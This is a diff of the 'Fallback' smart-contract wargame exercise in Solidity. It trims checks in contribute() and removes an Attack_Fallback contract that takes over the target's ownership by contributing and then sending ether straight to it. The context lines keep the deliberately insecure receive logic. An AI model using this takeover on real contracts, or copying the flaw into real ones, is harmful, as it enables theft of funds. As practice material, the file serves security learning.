@@ -20,8 +20,7 @@ contract Fallback {
     }
 
     function contribute() public payable {
-        require(msg.value > 0, "Fallback: not enough ether");
-        require(msg.value < 0.001 ether, "Fallback: too much");
+        require(msg.value < 0.001 ether);
         contributions[msg.sender] += msg.value;
         if (contributions[msg.sender] > contributions[owner]) {
             owner = msg.sender;
@@ -40,28 +39,4 @@ contract Fallback {
         require(msg.value > 0 && contributions[msg.sender] > 0);
         owner = msg.sender;
     }
-}
-
-contract Attack_Fallback {
-    address public target;
-
-    function set_target(address addr) public {
-        target = addr;
-    }
-
-    function deposit() public payable {
-        require(msg.value > 0, "depositnot enough ether");
-        Fallback(payable(target)).contribute{value : msg.value}();
-        //        (bool success, bytes memory data) = payable(target).call{value:1000000}(abi.encodeWithSignature("contribute()"));
-
-    }
-
-
-    function atk() public payable {
-        require(msg.value > 0, "not enough ether");
-        (bool sent,) = target.call{value : msg.value}("");
-        require(sent, "Failed to send Ether");
-
-    }
-
 }
